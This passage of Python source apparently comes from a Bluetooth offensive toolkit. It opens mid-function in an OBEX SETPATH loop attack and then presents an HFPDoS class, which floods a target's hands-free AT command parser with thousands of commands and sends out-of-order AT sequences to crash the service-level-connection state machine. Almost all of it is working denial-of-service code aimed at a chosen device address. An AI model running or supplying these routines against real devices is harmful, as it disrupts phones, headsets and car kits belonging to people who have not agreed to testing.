            # Send OBEX CONNECT
            connect_pkt = self._build_obex_connect()
            sock.send(connect_pkt)
            packets_sent += 1

            try:
                sock.settimeout(5)
                resp = sock.recv(1024)
                if len(resp) < 3 or resp[0] != 0xA0:
                    warning("OBEX CONNECT rejected or unexpected response")
            except socket.timeout:
                warning("No OBEX CONNECT response")

            # Alternate SETPATH forward and backward
            dir_names = ["telecom", "pb", "ich", "och", "mch",
                         "SIM1", "contacts", "calendar"]
            for i in range(count):
                if i % 2 == 0:
                    # Navigate into a directory
                    name = dir_names[i % len(dir_names)]
                    pkt = self._build_obex_setpath(name=name)
                else:
                    # Back up one level
                    pkt = self._build_obex_setpath(backup=True)
                try:
                    sock.send(pkt)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at SETPATH {i}")
                    return _make_result(self.target, "setpath_loop",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at SETPATH {i}")
                # Drain response
                try:
                    sock.settimeout(0.5)
                    sock.recv(256)
                except socket.timeout:
                    pass

        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass

        success(f"SETPATH loop complete: {packets_sent} requests sent")
        return _make_result(self.target, "setpath_loop", packets_sent,
                            start_time, "success")


# ===========================================================================
# HFP DoS
# ===========================================================================

class HFPDoS:
    """HFP (Hands-Free Profile) denial-of-service attacks.

    Targets the HFP Service Level Connection (SLC) state machine and AT
    command processor via RFCOMM.

    Usage:
        dos = HFPDoS("AA:BB:CC:DD:EE:FF")
        result = dos.at_command_flood(channel=10, count=5000)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = target
        self.hci = hci

    def at_command_flood(self, channel: int = 10,
                         count: int = 5000) -> dict[str, Any]:
        """Flood AT commands after SLC setup.

        Sends AT+CLCC (call list) and AT+COPS (operator selection)
        commands at maximum throughput to overwhelm the HFP AT parser.

        Args:
            channel: RFCOMM channel for HFP.
            count: Number of AT commands to send.
        """
        info(f"HFP AT command flood against {self.target} "
             f"(ch={channel}, {count} commands)")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
                                 BTPROTO_RFCOMM)
            sock.settimeout(10)
            sock.connect((self.target, channel))
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to RFCOMM channel {channel}: {exc}")
            return _make_result(self.target, "at_command_flood", 0,
                                start_time, "error", str(exc))

        try:
            # Minimal SLC setup
            slc_commands = [
                b"AT+BRSF=0\r",    # Supported features (none)
                b"AT+CIND=?\r",     # Indicator mapping
                b"AT+CIND?\r",      # Current indicators
                b"AT+CMER=3,0,0,1\r",  # Enable indicator reporting
            ]
            for cmd in slc_commands:
                try:
                    sock.send(cmd)
                    packets_sent += 1
                    time.sleep(0.1)
                    try:
                        sock.settimeout(2)
                        sock.recv(512)
                    except socket.timeout:
                        pass
                except (OSError, socket.error):
                    pass

            # Flood AT commands
            commands = [b"AT+CLCC\r", b"AT+COPS?\r", b"AT+CLCC\r",
                        b"AT+COPS=3,0\r"]
            for i in range(count):
                cmd = commands[i % len(commands)]
                try:
                    sock.send(cmd)
                    packets_sent += 1
                except (OSError, socket.error):
                    warning(f"Send failed at command {i}")
                    return _make_result(self.target, "at_command_flood",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Send failed at command {i}")
        finally:
            sock.close()

        success(f"AT command flood complete: {packets_sent} commands sent")
        return _make_result(self.target, "at_command_flood", packets_sent,
                            start_time, "success")

    def slc_state_confusion(self, channel: int = 10) -> dict[str, Any]:
        """Send out-of-order AT commands to confuse the SLC state machine.

        Sends commands in wrong order: AT+CHLD before AT+BRSF, repeated
        AT+BRSF with conflicting feature masks, call management commands
        before SLC is established, etc.

        Args:
            channel: RFCOMM channel for HFP.
        """
        info(f"HFP SLC state confusion against {self.target} (ch={channel})")
        start_time = time.time()
        packets_sent = 0

        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM,
                                 BTPROTO_RFCOMM)
            sock.settimeout(10)
            sock.connect((self.target, channel))
        except (OSError, socket.error) as exc:
            error(f"Failed to connect to RFCOMM channel {channel}: {exc}")
            return _make_result(self.target, "slc_state_confusion", 0,
                                start_time, "error", str(exc))

        # Out-of-order and confusing AT command sequence
        confusion_commands = [
            # Call management before SLC setup
            b"AT+CHLD=?\r",
            b"AT+CHLD=0\r",
            b"AT+CHUP\r",
            b"ATA\r",
            # Feature negotiation (should be first)
            b"AT+BRSF=0\r",
            # Repeat with different features
            b"AT+BRSF=4095\r",
            # Another feature negotiation (contradicts previous)
            b"AT+BRSF=127\r",
            # Indicator commands before CMER
            b"AT+CIND?\r",
            b"AT+CIND=?\r",
            # Enable reporting multiple times with different params
            b"AT+CMER=3,0,0,1\r",
            b"AT+CMER=3,0,0,0\r",
            b"AT+CMER=3,0,0,1\r",
            # Codec negotiation out of order
            b"AT+BCS=1\r",
            b"AT+BAC=1,2\r",
            b"AT+BCS=2\r",
            # HF indicators before setup
            b"AT+BIND=1,2\r",
            b"AT+BIND?\r",
            b"AT+BIND=?\r",
            # NREC toggle spam
            b"AT+NREC=0\r",
            b"AT+NREC=1\r",
            b"AT+NREC=0\r",
            # Volume spam
            b"AT+VGS=0\r",
            b"AT+VGS=15\r",
            b"AT+VGM=0\r",
            b"AT+VGM=15\r",
            # Repeat the whole confused sequence
            b"AT+CHLD=?\r",
            b"AT+BRSF=0\r",
            b"AT+CMER=3,0,0,1\r",
            b"AT+CHLD=1\r",
            b"AT+BRSF=4095\r",
        ]

        try:
            for cmd in confusion_commands:
                try:
                    sock.send(cmd)
                    packets_sent += 1
                    # Brief pause to let state machine process
                    time.sleep(0.05)
                    try:
                        sock.settimeout(1)
                        sock.recv(512)
                    except socket.timeout:
                        pass
                except (OSError, socket.error):
                    warning(f"Send failed after {packets_sent} commands")
                    return _make_result(self.target, "slc_state_confusion",
                                        packets_sent, start_time,
                                        "target_unresponsive",
                                        f"Connection lost after {packets_sent} commands")
        finally:
            sock.close()

        success(f"SLC state confusion complete: {packets_sent} commands sent")
        return _make_result(self.target, "slc_state_confusion", packets_sent,
                            start_time, "success",
                            f"{len(confusion_commands)} out-of-order AT commands")
